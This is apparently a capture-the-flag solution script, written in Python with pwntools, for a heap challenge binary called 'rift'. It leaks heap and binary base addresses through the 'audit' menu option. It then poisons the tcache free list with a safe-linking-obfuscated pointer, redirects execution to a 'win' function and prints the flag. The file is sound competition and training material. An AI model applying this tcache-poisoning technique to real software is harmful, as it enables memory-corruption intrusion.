#!/usr/bin/env python3

from pwn import *

exe = ELF("./rift")
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def create(size: int, data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"size: ", str(size).encode())
    r.sendafter(b"data: ", data)


def edit(idx: int, size: int, data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"idx: ", str(idx).encode())
    r.sendlineafter(b"size: ", str(size).encode())
    r.sendafter(b"data: ", data)


def show(idx: int) -> bytes:
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"idx: ", str(idx).encode())
    r.recvuntil(b"DATA\n")
    data = r.recvline()
    return data


def archive(idx: int):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"idx: ", str(idx).encode())
    r.recvuntil(b"\n")


def audit(idx: int) -> bytes:
    r.sendlineafter(b"> ", b"5")
    r.sendlineafter(b"idx: ", str(idx).encode())
    r.recvuntil(b"META\n")
    data = r.recvn(0x28)
    r.recvuntil(b"\nEND\n")
    return data


def cache(size: int, data: bytes):
    r.sendlineafter(b"> ", b"6")
    r.sendlineafter(b"size: ", str(size).encode())
    r.sendafter(b"data: ", data)


def obfuscate(addr: int, heap: int):
    return addr ^ (heap >> 12)


def main():
    r = conn()

    exe.sym["win"] = 0x18F0

    create(0x18, b"A" * 0x18)
    create(0x18, b"B" * 0x18)
    leaks = audit(0)

    heap = u64(leaks[16:24]) - 0x300
    exe.address = u64(leaks[24:32]) - 0x1830

    log.info(f"heap: {heap:#x}")
    log.info(f"binary: {exe.address:#x}")

    archive(1)
    archive(0)

    edit(0, 0x8, p64(obfuscate(heap + 0x2b0, heap)))

    cache(0x18, b"A" * 0x18)
    cache(0x18, p64(heap + 0x300) + p64(exe.sym["win"]) + p64(0x0000000100000000))

    flag = show(0).strip().decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()